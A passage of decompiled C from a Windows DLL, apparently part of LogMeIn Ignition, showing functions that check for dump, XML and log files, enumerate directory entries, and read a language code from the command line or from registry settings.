    iVar10 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar10 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10034880 */

void FUN_10034880(undefined4 *param_1)

{
  byte bVar1;
  uint uVar2;
  int *piVar3;
  int *piVar4;
  uint extraout_ECX;
  undefined4 extraout_ECX_00;
  int iVar5;
  undefined1 auStack_b8 [11];
  byte local_ad;
  int *local_ac;
  uint local_a8;
  int local_a4;
  int local_a0;
  int *local_9c;
  int *local_98;
  int *local_94;
  undefined4 local_90;
  undefined4 uStack_8c;
  undefined4 uStack_88;
  undefined4 uStack_84;
  undefined4 local_80;
  undefined4 uStack_7c;
  undefined4 uStack_78;
  undefined4 uStack_74;
  undefined4 local_70;
  undefined4 uStack_6c;
  undefined4 uStack_68;
  undefined4 uStack_64;
  undefined4 local_60;
  undefined4 uStack_5c;
  undefined4 uStack_58;
  undefined4 uStack_54;
  undefined4 local_50;
  undefined4 uStack_4c;
  undefined4 uStack_48;
  undefined4 uStack_44;
  undefined4 local_40;
  undefined4 uStack_3c;
  undefined8 uStack_38;
  uint local_24;
  void *local_1c;
  undefined1 *puStack_18;
  undefined4 local_14;
  
  puStack_18 = &LAB_10076a71;
  local_1c = ExceptionList;
  local_24 = DAT_100956e0 ^ (uint)auStack_b8;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xffffff40;
  ExceptionList = &local_1c;
  local_ac = (int *)*param_1;
  if (local_ac != (int *)0x0) {
    LOCK();
    *local_ac = *local_ac + 1;
    UNLOCK();
  }
  local_14 = 0;
  FUN_10020e80(L".dmp");
  local_a8 = FUN_10034420(uVar2);
  local_a8 = local_a8 & 0xffffff01;
  FUN_10020e80(L".xml");
  bVar1 = FUN_10034420();
  local_a8 = CONCAT31(local_a8._1_3_,(byte)local_a8 & bVar1);
  local_a4 = 0;
  local_a0 = 0;
  local_14._0_1_ = 1;
  local_ad = 1;
  uVar2 = extraout_ECX;
  while( true ) {
    FUN_1000bdd0(&DAT_10084cac,uVar2);
    FUN_1001e900(local_a4,extraout_ECX_00);
    piVar3 = (int *)FUN_1000bfa0(L".log",0xffffffff);
    if (piVar3 == (int *)0x0) {
      piVar4 = (int *)0x0;
    }
    else {
      piVar4 = piVar3 + 3;
    }
    local_94 = piVar3;
    FUN_10020e80(piVar4);
    FUN_10034420();
    FUN_10019e10(&local_9c);
    local_14 = CONCAT31(local_14._1_3_,2);
    FUN_1005ff60(&local_90,0,0x30);
    local_60 = local_90;
    uStack_5c = uStack_8c;
    uStack_58 = uStack_88;
    uStack_54 = uStack_84;
    local_50 = local_80;
    uStack_4c = uStack_7c;
    uStack_48 = uStack_78;
    uStack_44 = uStack_74;
    local_40 = local_70;
    uStack_3c = uStack_6c;
    uStack_38 = CONCAT44(uStack_64,uStack_68);
    piVar4 = (int *)FUN_1000ae10(&local_98);
    iVar5 = *piVar4;
    if ((iVar5 != 0) && (iVar5 != -0xc)) {
      if (iVar5 == 0) {
        iVar5 = 0;
      }
      else {
        iVar5 = iVar5 + 0xc;
      }
      iVar5 = FUN_1005a899(iVar5,&local_60);
      if (iVar5 != 0) {
        uStack_38 = 0;
      }
    }
    if (local_98 != (int *)0x0) {
      LOCK();
      iVar5 = *local_98;
      *local_98 = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(local_98);
      }
    }
    local_14._0_1_ = 1;
    if (local_9c != (int *)0x0) {
      LOCK();
      iVar5 = *local_9c;
      *local_9c = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(local_9c);
      }
    }
    if (((int)uStack_38 == 0) && (uStack_38._4_4_ == 0)) {
      local_a0 = local_a0 + 1;
    }
    else {
      bVar1 = FUN_10034420();
      local_ad = local_ad & bVar1;
    }
    uVar2 = (uint)local_ad;
    local_a4 = local_a4 + 1;
    if (local_ad == 0) break;
    if (2 < local_a0) {
LAB_10034abd:
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar5 = *piVar3;
        *piVar3 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
      if (local_ac != (int *)0x0) {
        LOCK();
        iVar5 = *local_ac;
        *local_ac = *local_ac + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(local_ac);
        }
      }
      ExceptionList = local_1c;
      FUN_100579df();
      return;
    }
  }
  local_a8 = local_a8 & 0xff;
  if (local_a0 < 3) {
    local_a8 = 0;
  }
  goto LAB_10034abd;
}



/* Function: FUN_10034b20 */

int __fastcall FUN_10034b20(int *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  int iVar3;
  int *local_8;
  
  local_8 = (int *)0x2e;
  iVar1 = FUN_10010c00();
  if (*param_1 == 0) {
    iVar3 = 0;
  }
  else {
    iVar3 = *(int *)(*param_1 + 8);
  }
  puVar2 = (undefined4 *)FUN_1000e640(&local_8,iVar1 + 1,iVar3 - (iVar1 + 1));
  iVar1 = FUN_10010440(*puVar2);
  *param_1 = iVar1;
  if (local_8 != (int *)0x0) {
    LOCK();
    iVar1 = *local_8;
    *local_8 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_8);
    }
  }
  if (*param_1 != 0) {
    return *param_1 + 0xc;
  }
  return 0;
}



/* Function: FUN_10034b90 */

void __thiscall FUN_10034b90(int *param_1,undefined4 param_2,int *param_3)

{
  char cVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  int iVar4;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int *piVar5;
  int *extraout_ECX_01;
  int *extraout_ECX_02;
  int *extraout_ECX_03;
  int *piVar6;
  int iVar7;
  int *piVar8;
  undefined8 uVar9;
  int *local_24;
  int *local_20;
  int *local_1c;
  int *local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076ac8;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  FUN_1000ba10(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  piVar8 = (int *)0x0;
  local_18 = (int *)0x0;
  local_8 = 0;
  local_14 = (int *)0x0;
  local_1c = (int *)FUN_1000bd10();
  local_8 = CONCAT31(local_8._1_3_,2);
  FUN_1000c820(1);
  if ((local_1c == (int *)0x0) || (local_1c[2] == 0)) {
    if (param_3 != (int *)0x0) {
      piVar8 = (int *)FUN_1000bdd0(param_3,extraout_ECX);
      if (piVar8 == (int *)0x0) {
        iVar4 = 0;
        piVar5 = (int *)0x0;
      }
      else {
        iVar4 = piVar8[2];
        piVar5 = piVar8 + 3;
      }
      local_18 = piVar8;
      cVar1 = FUN_1004ab70(iVar4,piVar5);
      if (cVar1 == '\0') {
        piVar8 = (int *)FUN_1000bfa0(&DAT_1008401c,0xffffffff);
        local_18 = piVar8;
      }
      local_24 = (int *)0x0;
      local_8 = CONCAT31(local_8._1_3_,3);
      iVar4 = FUN_1000c520(&local_24);
      piVar5 = extraout_ECX_01;
      if (iVar4 == 0) {
        FUN_10021a40(0,0);
        param_3 = local_20;
        if (local_20 != (int *)0x0) {
          LOCK();
          *local_20 = *local_20 + 1;
          UNLOCK();
        }
        FUN_1000c820(1);
        puVar3 = (undefined4 *)FUN_10019e10(&local_18);
        local_14 = (int *)FUN_10010440(*puVar3);
        if (local_18 != (int *)0x0) {
          LOCK();
          iVar4 = *local_18;
          *local_18 = iVar4 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(local_18);
          }
        }
        if (param_3 != (int *)0x0) {
          LOCK();
          iVar4 = *param_3;
          *param_3 = iVar4 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(param_3);
          }
        }
        piVar5 = local_20;
        if (local_20 != (int *)0x0) {
          LOCK();
          iVar4 = *local_20;
          *local_20 = iVar4 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(local_20);
            piVar5 = extraout_ECX_02;
          }
        }
      }
      if ((piVar8 != (int *)0x0) && (piVar5 = (int *)piVar8[2], piVar5 != (int *)0x0)) {
        local_14 = (int *)FUN_1000bfa0(piVar8 + 3,piVar5);
        piVar5 = extraout_ECX_03;
      }
      piVar8 = (int *)FUN_1000bdd0(&DAT_10088b44,piVar5);
      local_18 = piVar8;
      FUN_10035590();
      iVar4 = *param_1;
      uVar2 = FUN_10011570(iVar4,*(undefined4 *)(iVar4 + 4),&local_14);
      uVar9 = CONCAT44(uVar2,param_1[1]);
      if (param_1[1] == 0x15555554) {
        uVar9 = FUN_10056a6a("list<T> too long");
      }
      iVar7 = (int)((ulonglong)uVar9 >> 0x20);
      param_1[1] = (int)uVar9 + 1;
      *(int *)(iVar4 + 4) = iVar7;
      local_8 = CONCAT31(local_8._1_3_,2);
      **(int **)(iVar7 + 4) = iVar7;
      if (local_24 != (int *)0x0) {
        LOCK();
        iVar4 = *local_24;
        *local_24 = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_24);
        }
      }
    }
  }
  else {
    local_14 = (int *)FUN_1000bdd0(local_1c + 3,extraout_ECX);
    piVar8 = (int *)FUN_1000bdd0(&DAT_10088b44,extraout_ECX_00);
    local_18 = piVar8;
    FUN_10035590();
    iVar4 = *param_1;
    uVar2 = FUN_10011570(iVar4,*(undefined4 *)(iVar4 + 4),&local_14);
    uVar9 = CONCAT44(uVar2,param_1[1]);
    if (param_1[1] == 0x15555554) {
      uVar9 = FUN_10056a6a("list<T> too long");
    }
    iVar7 = (int)((ulonglong)uVar9 >> 0x20);
    param_1[1] = (int)uVar9 + 1;
    *(int *)(iVar4 + 4) = iVar7;
    **(int **)(iVar7 + 4) = iVar7;
  }
  piVar5 = *(int **)*param_1;
  if (piVar5 != (int *)*param_1) {
    do {
      param_3 = (int *)piVar5[2];
      if (param_3 != (int *)0x0) {
        LOCK();
        *param_3 = *param_3 + 1;
        UNLOCK();
      }
      local_8 = CONCAT31(local_8._1_3_,4);
      if (param_3 == (int *)0x0) {
        iVar4 = 0;
        piVar6 = (int *)0x0;
      }
      else {
        iVar4 = param_3[2];
        piVar6 = param_3 + 3;
      }
      cVar1 = FUN_1004ab70(iVar4,piVar6);
      if (cVar1 == '\0') {
        param_3 = (int *)FUN_1000bfa0(&DAT_1008401c,0xffffffff);
      }
      if ((piVar8 != (int *)0x0) && (piVar8[2] != 0)) {
        param_3 = (int *)FUN_1000bfa0(piVar8 + 3,piVar8[2]);
      }
      FUN_10034f00(&param_3,piVar5 + 2);
      local_8 = CONCAT31(local_8._1_3_,2);
      if (param_3 != (int *)0x0) {
        LOCK();
        iVar4 = *param_3;
        *param_3 = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(param_3);
        }
      }
      piVar5 = (int *)*piVar5;
    } while (piVar5 != (int *)*param_1);
  }
  if (local_1c != (int *)0x0) {
    LOCK();
    iVar4 = *local_1c;
    *local_1c = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_1c);
    }
  }
  if (local_14 != (int *)0x0) {
    LOCK();
    iVar4 = *local_14;
    *local_14 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_14);
    }
  }
  if (piVar8 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar8;
    *piVar8 = *piVar8 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar8);
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_10034f00 */

void __thiscall FUN_10034f00(int *param_1,int *param_2,undefined4 *param_3)

{
  ushort uVar1;
  char cVar2;
  int iVar3;
  int *piVar4;
  int *piVar5;
  int *piVar6;
  int *piVar7;
  undefined4 uVar8;
  undefined **ppuVar9;
  int iVar10;
  ushort *puVar11;
  bool bVar12;
  undefined8 uVar13;
  undefined6 uVar14;
  undefined4 local_270;
  int *local_26c;
  uint local_268;
  byte local_264 [44];
  short local_238 [274];
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075746;
  local_10 = ExceptionList;
  local_14 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if (*param_2 == 0) {
    iVar3 = 0;
  }
  else {
    iVar3 = *param_2 + 0xc;
  }
  piVar4 = (int *)FUN_10481bc6(iVar3,iVar3,local_264,local_14);
  if (piVar4 == (int *)0xffffffff) goto LAB_1003556f;
  if (local_238[0] == 0) {
    piVar5 = (int *)FUN_1000ba60();
  }
  else {
    piVar5 = (int *)FUN_1000bd10();
  }
  local_26c = (int *)FUN_1000bd10();
  local_268 = 3;
  cVar2 = FUN_1004b4e0();
  piVar7 = piVar4;
  piVar6 = piVar4;
  if (cVar2 == '\0') {
    if (local_238[0] == 0) {
      piVar6 = (int *)FUN_1000ba60();
    }
    else {
      piVar6 = (int *)FUN_1000bd10();
    }
    piVar7 = (int *)FUN_1000bd10();
    local_268 = 0xf;
    cVar2 = FUN_1004b4e0();
    if ((cVar2 != '\0') || ((local_264[0] & 0x10) == 0)) goto LAB_1003504f;
    local_270 = (int *)CONCAT13(1,(undefined3)local_270);
  }
  else {
LAB_1003504f:
    local_270 = (int *)((uint)local_270 & 0xffffff);
  }
  if (((local_268 & 8) != 0) && (local_268 = local_268 & 0xfffffff7, piVar7 != (int *)0x0)) {
    LOCK();
    iVar3 = *piVar7;
    *piVar7 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar7);
    }
  }
  if (((local_268 & 4) != 0) && (local_268 = local_268 & 0xfffffffb, piVar6 != (int *)0x0)) {
    LOCK();
    iVar3 = *piVar6;
    *piVar6 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar6);
    }
  }
  if (((local_268 & 2) != 0) && (local_268 = local_268 & 0xfffffffd, local_26c != (int *)0x0)) {
    LOCK();
    iVar3 = *local_26c;
    *local_26c = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(local_26c);
    }
  }
  if (((local_268 & 1) != 0) && (local_268 = local_268 & 0xfffffffe, piVar5 != (int *)0x0)) {
    LOCK();
    iVar3 = *piVar5;
    *piVar5 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar5);
    }
  }
  if (local_270._3_1_ == '\0') goto LAB_100351e0;
  piVar5 = (int *)*param_3;
  if (piVar5 != (int *)0x0) {
    LOCK();
    *piVar5 = *piVar5 + 1;
    UNLOCK();
  }
  local_8 = 0;
  if (piVar5 == (int *)0x0) {
    iVar3 = 0;
    piVar5 = (int *)0x0;
  }
  else {
    iVar3 = piVar5[2];
    piVar5 = piVar5 + 3;
  }
  cVar2 = FUN_1004ab70(iVar3,piVar5);
  if (cVar2 == '\0') {
    FUN_1000bfa0(&DAT_1008401c,0xffffffff);
  }
  local_26c = (int *)FUN_1000bfa0(local_238,0xffffffff);
  FUN_10035590();
  iVar3 = *param_1;
  uVar8 = FUN_10011570(iVar3,*(undefined4 *)(iVar3 + 4),&local_26c);
  uVar13 = CONCAT44(uVar8,param_1[1]);
  if (param_1[1] != 0x15555554) goto LAB_100351b1;
LAB_100351a7:
  uVar13 = FUN_10056a6a("list<T> too long");
LAB_100351b1:
  iVar10 = (int)((ulonglong)uVar13 >> 0x20);
  param_1[1] = (int)uVar13 + 1;
  *(int *)(iVar3 + 4) = iVar10;
  local_8 = 0xffffffff;
  **(int **)(iVar10 + 4) = iVar10;
  if (local_26c != (int *)0x0) {
    LOCK();
    iVar3 = *local_26c;
    *local_26c = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(local_26c);
    }
  }
LAB_100351e0:
  iVar3 = FUN_101389c6(local_264,piVar4,local_264);
  piVar5 = piVar4;
  piVar7 = piVar4;
  if (iVar3 != 0) {
    do {
      local_26c = piVar7;
      if (local_238[0] == 0) {
        piVar7 = (int *)FUN_1000ba60();
      }
      else {
        piVar7 = (int *)FUN_1000bd10();
      }
      local_268 = local_268 | 0x10;
      piVar6 = (int *)FUN_1000bd10();
      local_268 = local_268 | 0x20;
      if ((piVar7 == (int *)0x0) || (ppuVar9 = (undefined **)(piVar7 + 3), piVar7[2] == 0)) {
        ppuVar9 = &PTR_10083554;
      }
      if ((piVar6 == (int *)0x0) || (puVar11 = (ushort *)(piVar6 + 3), puVar11 == (ushort *)0x0)) {
        if ((ppuVar9 != (undefined **)0x0) && (*(ushort *)ppuVar9 != 0)) goto LAB_100353b9;
LAB_100352bd:
        local_270 = (int *)((uint)local_270 & 0xffffff);
      }
      else {
        if (ppuVar9 == (undefined **)0x0) {
          bVar12 = *puVar11 == 0;
        }
        else {
          do {
            uVar1 = *puVar11;
            bVar12 = uVar1 < *(ushort *)ppuVar9;
            if (uVar1 != *(ushort *)ppuVar9) {
LAB_1003529f:
              bVar12 = (-(uint)bVar12 | 1) == 0;
              goto LAB_100352ac;
            }
            if (uVar1 == 0) break;
            uVar1 = puVar11[1];
            bVar12 = uVar1 < *(ushort *)((int)ppuVar9 + 2);
            if (uVar1 != *(ushort *)((int)ppuVar9 + 2)) goto LAB_1003529f;
            puVar11 = puVar11 + 2;
            ppuVar9 = ppuVar9 + 1;
          } while (uVar1 != 0);
          bVar12 = true;
        }
LAB_100352ac:
        if (bVar12) goto LAB_100352bd;
LAB_100353b9:
        if (local_238[0] == 0) {
          piVar5 = (int *)FUN_1000ba60();
        }
        else {
          piVar5 = (int *)FUN_1000bd10();
        }
        local_268 = local_268 | 0x40;
        local_26c = (int *)FUN_1000bd10();
        local_268 = local_268 | 0x80;
        if ((piVar5 == (int *)0x0) || (ppuVar9 = (undefined **)(piVar5 + 3), piVar5[2] == 0)) {
          ppuVar9 = &PTR_10083554;
        }
        if ((local_26c == (int *)0x0) ||
           (puVar11 = (ushort *)(local_26c + 3), puVar11 == (ushort *)0x0)) {
          if ((ppuVar9 != (undefined **)0x0) && (*(ushort *)ppuVar9 != 0)) goto LAB_1003548d;
          goto LAB_100352bd;
        }
        if (ppuVar9 == (undefined **)0x0) {
          bVar12 = *puVar11 == 0;
        }
        else {
          do {
            bVar12 = *puVar11 < *(ushort *)ppuVar9;
            if (*puVar11 != *(ushort *)ppuVar9) {
LAB_10035461:
              bVar12 = (-(uint)bVar12 | 1) == 0;
              goto LAB_1003546e;
            }
            if (*puVar11 == 0) break;
            uVar1 = puVar11[1];
            bVar12 = uVar1 < *(ushort *)((int)ppuVar9 + 2);
            local_270 = (int *)CONCAT22(uVar1,(undefined2)local_270);
            if (uVar1 != *(ushort *)((int)ppuVar9 + 2)) goto LAB_10035461;
            puVar11 = puVar11 + 2;
            ppuVar9 = ppuVar9 + 1;
          } while (uVar1 != 0);
          bVar12 = true;
        }
LAB_1003546e:
        if (bVar12) goto LAB_100352bd;
LAB_1003548d:
        if ((local_264[0] & 0x10) == 0) goto LAB_100352bd;
        local_270 = (int *)CONCAT13(1,(undefined3)local_270);
      }
      if (((char)local_268 < '\0') && (local_268 = local_268 & 0xffffff7f, local_26c != (int *)0x0))
      {
        LOCK();
        iVar3 = *local_26c;
        *local_26c = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(local_26c);
        }
      }
      if (((local_268 & 0x40) != 0) && (local_268 = local_268 & 0xffffffbf, piVar5 != (int *)0x0)) {
        LOCK();
        iVar3 = *piVar5;
        *piVar5 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar5);
        }
      }
      if (((local_268 & 0x20) != 0) && (local_268 = local_268 & 0xffffffdf, piVar6 != (int *)0x0)) {
        LOCK();
        iVar3 = *piVar6;
        *piVar6 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar6);
        }
      }
      if (((local_268 & 0x10) != 0) && (local_268 = local_268 & 0xffffffef, piVar7 != (int *)0x0)) {
        LOCK();
        iVar3 = *piVar7;
        *piVar7 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar7);
        }
      }
      if (local_270._3_1_ != '\0') {
        piVar7 = (int *)*param_3;
        if (piVar7 != (int *)0x0) {
          LOCK();
          *piVar7 = *piVar7 + 1;
          UNLOCK();
        }
        local_8 = 1;
        if (piVar7 == (int *)0x0) {
          iVar3 = 0;
          piVar7 = (int *)0x0;
        }
        else {
          iVar3 = piVar7[2];
          piVar7 = piVar7 + 3;
        }
        cVar2 = FUN_1004ab70(iVar3,piVar7);
        if (cVar2 == '\0') {
          FUN_1000bfa0(&DAT_1008401c,0xffffffff);
        }
        local_270 = (int *)FUN_1000bfa0(local_238,0xffffffff);
        FUN_10035590();
        iVar3 = *param_1;
        iVar10 = FUN_10011570(iVar3,*(undefined4 *)(iVar3 + 4),&local_270);
        if (param_1[1] == 0x15555554) goto LAB_100351a7;
        param_1[1] = param_1[1] + 1;
        *(int *)(iVar3 + 4) = iVar10;
        local_8 = 0xffffffff;
        **(int **)(iVar10 + 4) = iVar10;
        if (local_270 != (int *)0x0) {
          LOCK();
          iVar3 = *local_270;
          *local_270 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(local_270);
          }
        }
      }
      iVar3 = FUN_105f55d3(piVar4,piVar4,local_264);
      piVar7 = local_26c;
      if (iVar3 == 0) break;
    } while( true );
  }
  uVar14 = FUN_10458cd5(piVar4);
  out((short)((uint6)uVar14 >> 0x20),(int)uVar14);
LAB_1003556f:
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10035590 */

int __fastcall FUN_10035590(int *param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075518;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_14 = param_1;
  piVar1 = (int *)FUN_1000ba60(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  local_8 = 0;
  iVar3 = 0;
  local_14 = piVar1;
  while ((*param_1 != 0 && (*param_1 != -0xc))) {
    iVar2 = FUN_100106a0(&local_14,1);
    if (iVar2 == 0) break;
    iVar3 = iVar3 + 1;
  }
  if (piVar1 != (int *)0x0) {
    LOCK();
    iVar2 = *piVar1;
    *piVar1 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(piVar1);
    }
  }
  ExceptionList = local_10;
  return iVar3;
}



/* Function: FUN_10035630 */

undefined4 * __fastcall FUN_10035630(undefined4 param_1)

{
  uint uVar1;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10076b08;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if ((DAT_1009b5c4 & 1) == 0) {
    DAT_1009b5c4 = DAT_1009b5c4 | 1;
    DAT_1009b5c8 = 0;
    local_8 = 1;
    FUN_100356a0(param_1);
    FUN_10057b51(&LAB_10078850,uVar1);
  }
  ExceptionList = local_10;
  return &DAT_1009b5c8;
}



/* Function: FUN_100356a0 */

int __fastcall FUN_100356a0(undefined4 param_1)

{
  int iVar1;
  ushort uVar2;
  undefined1 uVar3;
  char cVar4;
  uint uVar5;
  short *psVar6;
  int *piVar7;
  int iVar8;
  int *piVar9;
  int *piVar10;
  ushort *puVar11;
  undefined4 *puVar12;
  undefined4 uVar13;
  ushort *puVar14;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  int **ppiVar15;
  bool bVar16;
  undefined4 uVar17;
  wchar_t *pwVar18;
  undefined4 uVar19;
  wchar_t *pwVar20;
  wchar_t *pwVar21;
  int *local_30;
  int *local_2c;
  int *local_28;
  int *local_24;
  int *local_20;
  int *local_1c;
  int *local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076b62;
  local_10 = ExceptionList;
  uVar5 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  DAT_1009b5c8 = FUN_1000bdd0(&PTR_10083554,param_1);
  psVar6 = (short *)FUN_10348de4(uVar5);
  if ((psVar6 == (short *)0x0) || (*psVar6 != 0)) {
    piVar7 = (int *)FUN_1000bd10();
  }
  else {
    piVar7 = (int *)FUN_1000ba60();
  }
  local_8._0_1_ = 0;
  local_8._1_3_ = 0;
  local_18 = piVar7;
  iVar8 = FUN_1000c520(&DAT_1009b5c8);
  if (iVar8 != 0) {
    piVar9 = (int *)FUN_1000ae10(&local_24);
    if (*piVar9 == 0) {
      iVar8 = 0;
    }
    else {
      iVar8 = *piVar9 + 0xc;
    }
    iVar8 = FUN_10006250("/LANG specified: \'%s\'\n",iVar8);
    if (local_24 != (int *)0x0) {
      LOCK();
      iVar1 = *local_24;
      iVar8 = *local_24;
      *local_24 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        iVar8 = FUN_100579ee(local_24);
      }
    }
    goto LAB_10035bd3;
  }
  piVar9 = (int *)FUN_1000ae10(&local_28);
  if (*piVar9 == 0) {
    iVar8 = 0;
  }
  else {
    iVar8 = *piVar9 + 0xc;
  }
  FUN_10006250("GetCommandLine: \'%s\'\n",iVar8);
  if (local_28 != (int *)0x0) {
    LOCK();
    iVar8 = *local_28;
    *local_28 = iVar8 + -1;
    UNLOCK();
    if (iVar8 + -1 < 0) {
      FUN_100579ee(local_28);
    }
  }
  local_8 = 0xffffffff;
  if (piVar7 != (int *)0x0) {
    LOCK();
    iVar8 = *piVar7;
    *piVar7 = iVar8 + -1;
    UNLOCK();
    if (iVar8 + -1 < 0) {
      FUN_100579ee(piVar7);
    }
  }
  piVar7 = (int *)FUN_1003a0c0();
  local_20 = piVar7;
  piVar9 = (int *)FUN_1000bd10();
  local_8._0_1_ = 1;
  local_8._1_3_ = 0;
  local_14 = piVar9;
  if (piVar7[8] == 2) {
    piVar7 = (int *)FUN_1000bd10();
    local_18 = local_20 + 5;
    local_1c = piVar7;
    piVar10 = (int *)FUN_1001d340(&local_1c);
    local_2c = (int *)*local_18;
    if ((piVar10 == local_2c) || (cVar4 = FUN_1001d1f0(&local_1c,piVar10 + 4), cVar4 != '\0')) {
      ppiVar15 = &local_2c;
    }
    else {
      local_1c = piVar10;
      ppiVar15 = &local_1c;
    }
    piVar10 = *ppiVar15;
    if (piVar7 != (int *)0x0) {
      LOCK();
      iVar8 = *piVar7;
      *piVar7 = iVar8 + -1;
      UNLOCK();
      if (iVar8 + -1 < 0) {
        FUN_100579ee(piVar7);
      }
    }
    piVar7 = local_20;
    if ((int *)*local_18 == piVar10) {
      if (local_20[9] == 0) {
        local_2c = (int *)FUN_10058463(0x40,&DAT_10098020);
        local_8._0_1_ = 2;
        if (local_2c == (int *)0x0) {
          iVar8 = 0;
        }
        else {
          uVar13 = FUN_1003abd0();
          iVar8 = FUN_1003c970(uVar13);
        }
        local_8._0_1_ = 1;
        uVar3 = (undefined1)local_8;
        local_8._0_1_ = 1;
        piVar7[9] = iVar8;
        if (iVar8 != 0) {
          local_8._0_1_ = uVar3;
          FUN_1003ade0();
          FUN_1003aff0();
          goto LAB_1003599e;
        }
        FUN_1000ad00(L"GuardianLangCode",0xffffffff);
        local_8._0_1_ = 3;
        puVar12 = (undefined4 *)FUN_1001d190(&local_20);
        uVar13 = FUN_10010440(piVar9);
        *puVar12 = uVar13;
      }
      else {
LAB_1003599e:
        iVar8 = piVar7[9];
        if ((((iVar8 != 0) && (iVar8 = FUN_1003cb30(iVar8,&DAT_10088e54), iVar8 != 0)) &&
            (iVar8 = FUN_1003cb30(extraout_ECX,&DAT_10088e54), iVar8 != 0)) &&
           (iVar8 = FUN_1003cb30(extraout_ECX_00,L"Software"), iVar8 != 0)) {
          pwVar20 = L"LogMeIn Ignition";
          pwVar18 = L"Software";
          uVar13 = extraout_ECX_01;
          uVar17 = extraout_ECX_01;
          FUN_1003cb30(extraout_ECX_01,&DAT_10088e54);
          FUN_1003cb30(uVar13,pwVar18);
          iVar8 = FUN_1003cb10(uVar17,pwVar20);
          if (iVar8 != 0) {
            pwVar21 = L"Settings";
            pwVar20 = L"LogMeIn Ignition";
            pwVar18 = L"Software";
            uVar13 = extraout_ECX_02;
            uVar17 = extraout_ECX_02;
            uVar19 = extraout_ECX_02;
            FUN_1003cb30(extraout_ECX_02,&DAT_10088e54);
            FUN_1003cb30(uVar13,pwVar18);
            FUN_1003cb30(uVar17,pwVar20);
            iVar8 = FUN_1003cb10(uVar19,pwVar21);
            if (iVar8 != 0) {
              pwVar21 = L"Settings";
              pwVar20 = L"LogMeIn Ignition";
              pwVar18 = L"Software";
              uVar13 = extraout_ECX_03;
              uVar17 = extraout_ECX_03;
              uVar19 = extraout_ECX_03;
              FUN_1003cb30(extraout_ECX_03,&DAT_10088e54);
              FUN_1003cb30(uVar13,pwVar18);
              FUN_1003cb30(uVar17,pwVar20);
              FUN_1003cb30(uVar19,pwVar21);
              iVar8 = FUN_1003cb10(extraout_ECX_04,L"GuardianLangCode");
              if (iVar8 == 0) {
